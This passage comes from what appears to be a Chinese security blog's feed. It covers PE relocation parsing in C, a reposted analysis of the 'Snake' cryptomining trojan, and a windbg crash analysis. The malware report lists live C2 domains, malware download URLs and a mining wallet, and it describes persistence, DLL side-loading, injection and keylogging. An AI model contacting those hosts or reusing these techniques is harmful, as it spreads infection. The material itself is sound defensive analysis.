VirtualAddress是重定位数组的RVA，**但是需要每个重定位数组地址加上这个RVA才是真正的重定位数组的地址**</div><div class="line">* SizeofBlock：重定位结构大小</div><div class="line">* TypeOffset：两个字节，<span class="number">16</span>位，高<span class="number">4</span>位表示重定位类型，低<span class="number">12</span>位表示重定位地址</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如图所有，解析如下：</div><div class="line"></div><div class="line">* VirtualAddress：<span class="number">00001000</span></div><div class="line">* sizeofBlock：<span class="number">10</span>H--&gt;(<span class="number">10</span>H<span class="number">-8</span>H)/<span class="number">2</span>=<span class="number">4</span>,一共有四个重定位数组，<span class="number">8</span>H指的是VirtualAddress和sizeofBlock所占的字节数为<span class="number">8</span>，除以<span class="number">2</span>H，表示一个TypeOffset为<span class="number">2</span>个字节。</div><div class="line">* Data1:<span class="number">0F</span>30--&gt;<span class="number">300F</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">00F</span>--&gt;RVA:<span class="number">100F</span>h---&gt;FOA:<span class="number">60F</span></div><div class="line">* Data2:<span class="number">2330</span>--&gt;<span class="number">3023</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">023</span>--&gt;RVA:<span class="number">1023</span>h---&gt;FOA:<span class="number">623</span></div><div class="line">* Data3:<span class="number">0000</span></div><div class="line">* Data4:<span class="number">0000</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;得到需要重定位的数据为<span class="number">00402000</span>和<span class="number">00403030</span>，假设当前基地址为<span class="number">00400000</span>，目标基地址为<span class="number">01000000</span> 则重定位后的地址为<span class="number">01002000</span>和<span class="number">01003030</span></div><div class="line"></div><div class="line"><span class="meta">## 0x3.3 重定位表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先获取重定位表地址</div></pre></td></tr></table></figure></p><p>//重定位表地址<br>DWORD RelocTableRva = pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>//    printf(“\t\t [<em>]RelocTableRva:%p\n”, RelocTableRva);<br>PIMAGE_BASE_RELOCATION RelocTable =(PIMAGE_BASE_RELOCATION)((ULONG)lpBaseAddress+RvaToOffset(RelocTableRva,lpBaseAddress));<br>printf(“\t\t [</em>]RelocTable:%p\n”, RelocTable);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取每个重定位数组的RVA地址和大小，原因有二，第一，获取完TypeOffset的第<span class="number">12</span>位需要加上VirtualAddress才是真正的RVA，第二，sizeofBlock是指向下一个重定位数组(块)的重要参数。</div></pre></td></tr></table></figure></p><p>DWORD VirtualAddress = RelocTable-&gt;VirtualAddress;<br>printf(“\t\t [*]VirtualAddress:%p”, VirtualAddress);<br>DWORD Cout = (RelocTable-&gt;SizeOfBlock - 8) / 2;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;定位到重定位数组，每个Typeoffset在偏移处第八个字节，所以需要加<span class="number">8</span>。</div></pre></td></tr></table></figure></p><p>WORD<em> RecAddr = (WORD</em>)((BYTE*)RelocTable + 8);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;解析TypeOffset</div></pre></td></tr></table></figure></p><p>//取第三位地址，并加上VirtualAddress才是真的RVA<br>DWORD offset = VirtualAddress + (RecAddr[j] &amp; 0x0FFF);<br>//TYPE<br>DWORD type = RecAddr[j] &gt;&gt; 12;<br>printf(“\t\t Type:[%d] \t RVA:[%p]\n”, type, offset);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;利用sizeofblock定位下一个重定位表</div></pre></td></tr></table></figure></p><p>RelocTable = (IMAGE_BASE_RELOCATION <em>)((BYTE </em>)RelocTable + RelocTable-&gt;SizeOfBlock);<br>```</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
      
    
    </summary>
    
      <category term="windows安全" scheme="http://yoursite.com/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>贪吃蛇挖矿木马团伙分析报告</title>
    <link href="http://yoursite.com/2019/04/18/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_20_%E8%B4%AA%E5%90%83%E8%9B%87%E2%80%9D%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%9B%A2%E4%BC%99/"/>
    <id>http://yoursite.com/2019/04/18/病毒分析技术_20_贪吃蛇”挖矿木马团伙/</id>
    <published>2019-04-18T07:02:11.000Z</published>
    <updated>2019-05-10T04:55:07.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x1-概述"><a href="#0x1-概述" class="headerlink" title="0x1 概述"></a>0x1 概述</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;腾讯御见威胁情报中心监测到“贪吃蛇”挖矿木马团伙针对MS SQL服务器进行暴破攻击，攻击成功后利用多个提权工具进行提权，随后植入门罗币挖矿木马、大灰狼远程控制木马、以及键盘记录程序。本次传播的“大灰狼”远控采用更隐秘的DNS隧道通信技术，可绕过大部分软件防火墙，多次利用大厂商白文件进行攻击。【转】</p><h1 id="0x2-IoC"><a href="#0x2-IoC" class="headerlink" title="0x2 IoC"></a>0x2 IoC</h1><h2 id="0x2-1-C2"><a href="#0x2-1-C2" class="headerlink" title="0x2.1 C2"></a>0x2.1 C2</h2><ul><li>aaaa.usa-138.com</li><li><a href="http://sql.4i7i.com/32.exe" target="_blank" rel="external">http://sql.4i7i.com/32.exe</a></li><li><a href="http://4i7i.com/11.exe" target="_blank" rel="external">http://4i7i.com/11.exe</a></li><li>o.ry52cc.cn,aaaa.usa-138.com</li><li>o.ry52cc.cn</li><li>vtqq.f3322.net</li><li>www.memejerry.top</li><li>syw520.3322.org</li><li><a href="http://sql.4i7i.com/64.exe" target="_blank" rel="external">http://sql.4i7i.com/64.exe</a></li></ul><h2 id="0x2-2-SHA256"><a href="#0x2-2-SHA256" class="headerlink" title="0x2.2 SHA256"></a>0x2.2 SHA256</h2><ul><li>5681ae28f984efd6bf1f2ed324cf9a9a14834a8738d58a295aee1bd5fb0d40bf</li><li>86c2b941b1f9ad3b461ca4902f7920b68180bc0f8cf9e7ed53e34a8971e3f95a</li><li>bdc2aeb40e7d81c48474392ba5ea4bfa32ef430a78cb86ef2e619ee21b27da22</li><li>678a4b2c0377bb500b34c6b80f54ef26583adc31a9ad7b899e1579143e3f6624</li><li>abd4afd71b3c2bd3f741bbe3cec52c4fa63ac78d353101d2e7dc4de2725d1ca1</li><li>7538b643ed550032aad2c11e650c51d7c261cf8c714c34bd636164a7518184c0</li><li>678a4b2c0377bb500b34c6b80f54ef26583adc31a9ad7b899e1579143e3f6624</li><li>e8c726d1301ac3cdbf2532f5d54e93fc7620cab76381b35ac5f6c5990b19efa1</li><li>d56fc3208cace3c87a7ce2b3520519ee8003c4324bb8da6aaf3c8c629a5eef6d</li><li>abd4afd71b3c2bd3f741bbe3cec52c4fa63ac78d353101d2e7dc4de2725d1ca1</li><li>6e81d7c71b3e8d731e11ad75d3dac02a4210c9f90fac618af5c00cbce3718658</li><li>5681ae28f984efd6bf1f2ed324cf9a9a14834a8738d58a295aee1bd5fb0d40bf</li></ul><h1 id="0x3-感染现象："><a href="#0x3-感染现象：" class="headerlink" title="0x3 感染现象："></a>0x3 感染现象：</h1><ul><li>1）下载多个恶意文件或者白加黑文件，如mscorsvws.exe，aspnet_wp.exe等</li><li>2）链接aaaa.usa-138.com，与C2进行交互</li><li>3）链接<a href="http://sql.4i7i.com/和http://4i7i.com/释放后门程序和挖矿程序" target="_blank" rel="external">http://sql.4i7i.com/和http://4i7i.com/释放后门程序和挖矿程序</a></li><li>4）创建服务用于常驻</li><li>5）执行挖矿操作<br>  <img src="http://hacky.wang/blog/20190510/HaWyx9RV3APl.png?imageslim" alt="mark"></li></ul><h1 id="0x4-样本分析"><a href="#0x4-样本分析" class="headerlink" title="0x4 样本分析"></a>0x4 样本分析</h1><h2 id="0x4-1：主体样本"><a href="#0x4-1：主体样本" class="headerlink" title="0x4.1：主体样本"></a>0x4.1：主体样本</h2><ul><li>1) 得到的原始样本SHA值为bdc2aeb40e7d81c48474392ba5ea4bfa32ef430a78cb86ef2e619ee21b27da22，加了UPX的壳，脱去外壳得到样本</li><li>2) 判断是否是管理员用户，如果是管理员用户会执行如3-11的操作<br>   <img src="http://hacky.wang/blog/20190510/krMgxOWrhg6C.png?imageslim" alt="mark"></li><li>3）创建一个名为clr_optimization的服务，映像路径如下：<code>%windowsdir%\ Framework\mscorsvws.exe</code><br>  <img src="http://hacky.wang/blog/20190510/AfIXQ8ECdx0B.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/7tirX56pAfj6.png?imageslim" alt="mark"></li><li>4）判断是否存在C:\WINDOWS\Microsoft.NET\Framework\mscorsvws.exe，如果存在，则执行，否则创建文件mscorsvws.exe，并这是只读，隐藏，系统属性<br>  <img src="http://hacky.wang/blog/20190510/OEpqJpttk9mu.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/fjmI9KnRF6sV.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/3F5s07wsMY4W.png?imageslim" alt="mark"></li><li>5) 创建C:\WINDOWS\Microsoft.NET\Framework\aspnet_wp.exe，并设置只读，系统，隐藏属性，并执行。此样本是一个白加黑的样本。<br>  <img src="http://hacky.wang/blog/20190510/2vi9Eirssyr4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/mG8gRqH7jL7x.png?imageslim" alt="mark"></li><li>6) 创建C:\WINDOWS\Microsoft.NET\Framework\ETComm.dll，这是aspnet_wp.exe的必备组件<br>  <img src="http://hacky.wang/blog/20190510/i8JwcIa0rww4.png?imageslim" alt="mark"></li><li>7）创建C:\WINDOWS\MpMgSvc.dll文件<br>  <img src="http://hacky.wang/blog/20190510/lEog0Wf2gQID.png?imageslim" alt="mark"></li><li>8）给如下进程进行提权，主要提升如下权限：SeRestorePrivilege，SeBackupPrivilege，SeSecurityPrivilege，SeTakeOwnershipPrivilege，其中需要提权的进程主要有”<ul><li>C:\Windows\system32\sethc.exe，</li><li>C:\Windows\system32\osk.exe</li><li>C:\Windows\system32\Magnify.exe,</li><li>C:\Windows\system32\Narrator.exe</li><li>C:\Windows\system32\Utilman.exe<br><img src="http://hacky.wang/blog/20190510/ukjYIX5uIMrY.png?imageslim" alt="mark"></li></ul></li><li>9）利用calc工具拒绝system对C:\Windows\Fonts*.exe进行访问<br>  <img src="http://hacky.wang/blog/20190510/uV3XaVNJB09t.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/nXraFfMexshp.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/NdVDt7O5Xae3.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/grbWT6Xtj8v5.png?imageslim" alt="mark"></li><li>10）创建从<a href="http://4i7i.com/11.exe处，创建11.exe，并执行11.exe" target="_blank" rel="external">http://4i7i.com/11.exe处，创建11.exe，并执行11.exe</a></li><li>11）如果不是管理员用户，则使用傀儡进程技术<br>  <img src="http://hacky.wang/blog/20190510/cKvkodvcTfkh.png?imageslim" alt="mark"></li><li>12）判断程序是在32位系统中还是64位系统，由此解密不同的恶意文件<br>  <img src="http://hacky.wang/blog/20190510/bzGAeXBNPsdq.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/hsoY0jkohztG.png?imageslim" alt="mark"></li><li><p>13) 在当前目录下创建TrustedInsteller.exe，TrustedInsteller.exe是一个挖矿程序，然后执行挖矿：<br>矿池为pool.usa-138.com:80，<br>钱包地址为<code>4B7yFmYw2qvEtWZDDnZVeY16HHpwTtuYBg6EMn5xdDbM3ggSEnQFDWDHH6cqdEYaPx4iQvAwLNu8NLc21QxDU84GGxZEY7S。</code><br>  <img src="http://hacky.wang/blog/20190510/FGWkMk5lt08P.png?imageslim" alt="mark"></p></li><li><p>14）通过dump侵入svchost.exe执行傀儡进程操作的文件。首先程序会Kill rundll32.exe这个进程，这步的目的是后续的样本会使用rundll32.exe加载dll文件<br>  <img src="http://hacky.wang/blog/20190510/IB5u4MBbxQUb.png?imageslim" alt="mark"></p></li><li>15）检测路径是否处于%windows%下，接着设置服务函数ServiceProc分析服务函数，我们知道其执行了一下三个重要操作。1.提升进程权限，创建伪句柄，2.并且与CC服务器交互3.获取设备相关信息(主要包括处理器信息，系统物理和虚拟内存使用情况，设备驱动器信息和驱动程序信息)<br>  <img src="http://hacky.wang/blog/20190510/2R8mygUD8C8q.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/2EUe71RUzVk8.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/HdhSbjuOYBh4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/rBda6vahQ9PB.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/iQkmHiehagr3.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/vh6ObPvqa9yp.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/DxvvmEhUeNar.png?imageslim" alt="mark"></li><li>16）开始服务aspnet_staters<br>  <img src="http://hacky.wang/blog/20190510/OYxRtUWkje0q.png?imageslim" alt="mark"></li><li>17）并设置程序自启动<br>  <img src="http://hacky.wang/blog/20190510/Bl3z6GvRTWbO.png?imageslim" alt="mark"></li><li>18）设置注册表数据,主要是设置aspnet_staters服务的相关信息，以便其他样本读取，并判断是否被感染<br>  <img src="http://hacky.wang/blog/20190510/PDj8nJDKQzAl.png?imageslim" alt="mark"></li><li>19）检索大多数国内安全厂商进程<br>  <img src="http://hacky.wang/blog/20190510/KmVGo6fm3BsR.png?imageslim" alt="mark"></li></ul><h2 id="0x4-2-11-exe分析"><a href="#0x4-2-11-exe分析" class="headerlink" title="0x4.2 11.exe分析"></a>0x4.2 11.exe分析</h2><ul><li>1）创建文件C:\WINDOWS\Help\Helpsvc.exe.创建名为WinHelpSvcs的服务，二进制文件为Helpsvc.exe，实现永久化<br>  <img src="http://hacky.wang/blog/20190510/wYgKWgimC15p.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/jgfRxwDwyDD1.png?imageslim" alt="mark"></li><li>2）将HelpSvc.exe设置系统隐藏属性<br>  <img src="http://hacky.wang/blog/20190510/eB2OtTMrLbsv.png?imageslim" alt="mark"></li><li>3）创建C:\WINDOWS\Help\Winlogon.exe同样设置隐藏系统属性，并执行。<br>  <img src="http://hacky.wang/blog/20190510/gKKhLzBIwFle.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/JonOtMe1BIhj.png?imageslim" alt="mark"></li><li>4）创建C:\WINDOWS\Help\active_desktop_render.dll文件<br>  <img src="http://hacky.wang/blog/20190510/NKn1l7WE9nEw.png?imageslim" alt="mark"></li><li>5）删除服务<br>  <img src="http://hacky.wang/blog/20190510/tNFVva9o3G1M.png?imageslim" alt="mark"></li><li>6）配置IPSEC安全策略(DNS桥隧通信)<br>  <img src="http://hacky.wang/blog/20190510/FqyhBRqv3J3X.png?imageslim" alt="mark"></li><li>7）利用cacls禁止system用户对如下文件访问<ul><li>C:\ProgramData\Storm\update\%YOUSHIZHUAY%*.cc3</li><li>C:\ProgramData\DRM\%SESSIONNAME%*.cc3</li><li>C:\ProgramData\Storm\update\%SESSIONNAME%*.cc3</li></ul></li><li>8）关闭LanmanServer和Schedule服务<br>  <img src="http://hacky.wang/blog/20190510/74ycM7lGJJ65.png?imageslim" alt="mark"></li><li>9）自删除<br>  <img src="http://hacky.wang/blog/20190510/5HIypipYISzj.png?imageslim" alt="mark"></li></ul><h2 id="0x4-3：Winlogon-exe分析"><a href="#0x4-3：Winlogon-exe分析" class="headerlink" title="0x4.3：Winlogon.exe分析"></a>0x4.3：Winlogon.exe分析</h2><ul><li>1）首先这是一个白加黑的样本，利用kugou需要加载active_desktop_render.dll调用SetDesktopMonitorHook的原理，改写active_desktop_render.dll文件，实现白加黑的技术。主要分析在于对active_desktop_render_new.dll的分析</li><li>2）HOOK svchost进程，为了是为了调用TrustedInstaller.exe_进行挖矿。<br>  <img src="http://hacky.wang/blog/20190510/IJJAKYtSLMcf.png?imageslim" alt="mark"></li><li>3）这三个删除创建操作是为了恢复原来存在的active_desktop_render.dll文件<br>  <img src="http://hacky.wang/blog/20190510/rBvG72LdD9Uz.png?imageslim" alt="mark"></li><li>4) 检索HelpSvc.exe，并终止进程<br>  <img src="http://hacky.wang/blog/20190510/axAinKkNRO3q.png?imageslim" alt="mark"></li><li>5）键盘记录<br>  <img src="http://hacky.wang/blog/20190510/5levR6lwmFg8.png?imageslim" alt="mark"></li><li>6）传输音频数据<br>  <img src="http://hacky.wang/blog/20190510/hKKqxDEYgeAl.png?imageslim" alt="mark"></li><li>7）截屏<br>  <img src="http://hacky.wang/blog/20190510/0TCBVdkf2vdn.png?imageslim" alt="mark"></li></ul><h2 id="0x4-4：active-desktop-render-new-dll分析"><a href="#0x4-4：active-desktop-render-new-dll分析" class="headerlink" title="0x4.4：active_desktop_render_new.dll分析"></a>0x4.4：active_desktop_render_new.dll分析</h2><ul><li>1) 首先这是利用白加黑实现的一次攻击，通过酷狗音乐调用SetDesktopMonitorHook进行团伙的黑操作。<br>  <img src="http://hacky.wang/blog/20190510/cn0WWXqmfRTl.png?imageslim" alt="mark">    </li><li>2) 样本会侵入svchost这一个系统关键宿主进程，这样为了迷惑用户，以至于难以察觉。从编码方式上来看，是同一个作案团伙，同样使用jmp-API,或者jmp-Fun这类操作，没有直接调用函数或者API，有效阻碍分析人员分析。<br>  <img src="http://hacky.wang/blog/20190510/kCGRiGMa1eVl.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/g9bkPdFPI7KJ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/cXh6lO3BWPU4.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/x80YDQpWaeIM.png?imageslim" alt="mark"></li><li>3) 由于样本是白加黑，为了避免由于黑文件存在影响正常的功能，所以样本会释放以前正常的dll文件，并替换。<br>  <img src="http://hacky.wang/blog/20190510/0W4pYT7pVMC4.png?imageslim" alt="mark"></li><li>4) 最后程序会终止HelpSvc.exe进程<br>  <img src="http://hacky.wang/blog/20190510/UDGiTLwGzJws.png?imageslim" alt="mark"><h2 id="0x4-5-MpMgSvc-dll分析"><a href="#0x4-5-MpMgSvc-dll分析" class="headerlink" title="0x4.5 MpMgSvc.dll分析"></a>0x4.5 MpMgSvc.dll分析</h2></li><li>1）从样本维度看，这是一个dll文件，暂时没有找到调用他的PE文件，所以一下只能从功能上分析。由此可知，这是一个连接C2,并根据不同的指令执行对应的操作，包括检索服务信息，设置服务，获取会话，用户信息，关闭指定进程，断开注销会话等操作。<br>  <img src="http://hacky.wang/blog/20190510/zg4QzYxqMabY.png?imageslim" alt="mark"></li><li>2）创建服务和设置服务的启动状态，借此实现常驻内存。<br>  <img src="http://hacky.wang/blog/20190510/y0zsduyJC7nD.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/4MHQzQA64mNj.png?imageslim" alt="mark"></li><li>3）获取用户信息，检索会话信息，根据不同指令，执行不同操作<br>  <img src="http://hacky.wang/blog/20190510/ryXUQ0u62f55.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/aqPaqaBdyOYk.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/z08O6yujlfz2.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/8bvDCar3ydbx.png?imageslim" alt="mark"></li><li>4）通过管道通信，传输用户信息<br>  <img src="http://hacky.wang/blog/20190510/85JYxecnSneB.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/4fHlnlFa8el1.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/KikdtuCJUUsk.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/TF8ebth0MqrS.png?imageslim" alt="mark"></li><li>5）判断进程列表中是否存在指定的进程<br>  <img src="http://hacky.wang/blog/20190510/2BGxdeWwFVrK.png?imageslim" alt="mark"></li><li>6）检索windows窗口信息<br>  <img src="http://hacky.wang/blog/20190510/pOvwwdgzOv7v.png?imageslim" alt="mark"></li><li>7) 获取机器相关信息<br>  <img src="http://hacky.wang/blog/20190510/uVK4p8ot5z19.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/Ut0fdaAyTyjQ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/yp8JVvm1pG9w.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/320sQGVAKwuw.png?imageslim" alt="mark"><h2 id="0x4-6：aspnet-wp-exe"><a href="#0x4-6：aspnet-wp-exe" class="headerlink" title="0x4.6：aspnet_wp.exe"></a>0x4.6：aspnet_wp.exe</h2></li><li>1) 盛大的白加黑文件，黑文件是ETComm.dll，其中ETComm.dll。而且运行之后会跑非，怀疑存在反调试，OD设置中断在系统断点，加载后，中断。然后Alt+E，找到ETComm.dll脱壳。最好不要使用直接对dll脱壳，这样修复有点问题。</li><li>2）创建clr_optimization_v3.0.50727_32服务<br>   <img src="http://hacky.wang/blog/20190510/MNhbPBh6o0Ck.png?imageslim" alt="mark"></li><li>3）入侵svchost.exe进程<br>  <img src="http://hacky.wang/blog/20190510/uHGYlilsBUPJ.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/DjKHeAwpYMXq.png?imageslim" alt="mark"></li><li>2) 释放隐藏文件ETComm.dll到当前目录，这其实是正常的ETComm.dll，当操作执行完毕后，删除黑文件ETComm.dll<br>  <img src="http://hacky.wang/blog/20190510/CRY1QFXhnYKy.png?imageslim" alt="mark"></li><li>3) 终止mscprsvws.exe，爆破sql<br>  <img src="http://hacky.wang/blog/20190510/8gpyI3WerRLL.png?imageslim" alt="mark"></li><li>4）通过dump入侵svchost.exe的PE，主要功能是启动aspnet_wp.exe对应的服务。并设置自启动<br>  <img src="http://hacky.wang/blog/20190510/asB01XyFUT4F.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190510/PbmulBlqs3VP.png?imageslim" alt="mark"></li><li>5）在特定情况下也会解析如下域名<ul><li>o.ry52cc.cn</li><li>aaaa.usa-138.com</li><li>o.ry52cc.cn</li><li>vtqq.f3322.net</li><li>syw520.3322.org</li><li>www.memejerry.top<br><img src="http://hacky.wang/blog/20190510/VQPWlXu8TtME.png?imageslim" alt="mark"></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x1-概述&quot;&gt;&lt;a href=&quot;#0x1-概述&quot; class=&quot;headerlink&quot; title=&quot;0x1 概述&quot;&gt;&lt;/a&gt;0x1 概述&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
      
    
    </summary>
    
      <category term="windows安全" scheme="http://yoursite.com/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>《windows PE》导入表</title>
    <link href="http://yoursite.com/2019/03/09/%E4%B8%80%E7%AF%87%E7%9F%AD%E6%96%87%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E8%93%9D%E5%B1%8F%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/03/09/一篇短文带你了解蓝屏分析/</id>
    <published>2019-03-09T06:02:11.000Z</published>
    <updated>2019-03-09T14:04:44.208Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="0x01-初始分析"><a href="#0x01-初始分析" class="headerlink" title="0x01 初始分析"></a>0x01 初始分析</h2><ul><li>首先利用windbg装载dump文件，然后使用<code>!analyze</code>分析，得到初步的分析结果，由于DRIVER_IRQL_NOT_LESS_OR_EQUAL这个错误造成的。结合MSDN得出的结论：当<strong>IRQL太高时，驱动程序试图访问可分页（或完全无效）的地址。</strong><br>  <img src="https://i.imgur.com/VjmjF4Q.png" alt=""></li><li>此时，我们使用<code>!analyze -v</code>分析具体的蓝屏信息，可以验证之前获得的蓝屏产生原因：在高IRQL的进程驱动尝试读取位于ffffa905aec3f00c的内容<br>  <img src="https://i.imgur.com/uUO2FYb.png" alt=""></li><li>我们查看此处ffffa905aec3f00c的内存空间，发现这是一个未被初始化的内存地址<br>  <img src="https://i.imgur.com/USYeJpO.png" alt=""></li><li>接着，我们查看一下是那段代码发生了读异常，使用栈回溯。可以发现可能是在<code>RNDISMP6!ReceivePacketMessage+0x3a7</code>发生了异常<br>  <img src="https://i.imgur.com/tuddFUg.png" alt=""></li><li>我们查看上述地址执行了什么指令，使用<code>u RNDISMP6!ReceivePacketMessage+0x3a7</code>查看那处的反汇编指令，发现程序在fffff8018ea03bd7存在一个数据传送指令<code>mov     eax,dword ptr [rdx+4]</code>，为了验证猜想是否是内存ffffa905aec3f00c处的数据未初始化，我们查看一下[rdx+4]的内容。<code>dd [rdx+4]</code>,地址位于ffffa905`aec3f010(和ffffa905aec3f00c相差两个字节)说明windbg的分析是可靠的<br>  <img src="https://i.imgur.com/sNh7Cpg.png" alt=""><br>  <img src="https://i.imgur.com/Cd1CGzR.png" alt=""></li><li>而且通过使用栈回溯，我们发现发生问题的驱动可能是<code>usb80236</code><br>  <img src="https://i.imgur.com/LXJfYu8.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-初始分析&quot;&gt;&lt;a href=&quot;#0x01-初始分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 初始分析&quot;&gt;&lt;/a&gt;0x01 初始分析&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;首先利用windbg装载dump文件
      
    
    </summary>
    
      <category term="windows PE" scheme="http://yoursite.com/categories/windows-PE/"/>
    
    
  </entry>
  
  <entry>
    <title>反虚拟机技术</title>
    <link href="http://yoursite.com/2019/02/26/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2019/02/26/反虚拟机技术/</id>
    <published>2019-02-26T07:02:11.000Z</published>
    <updated>2019-03-02T11:36:32.970Z</updated>
    
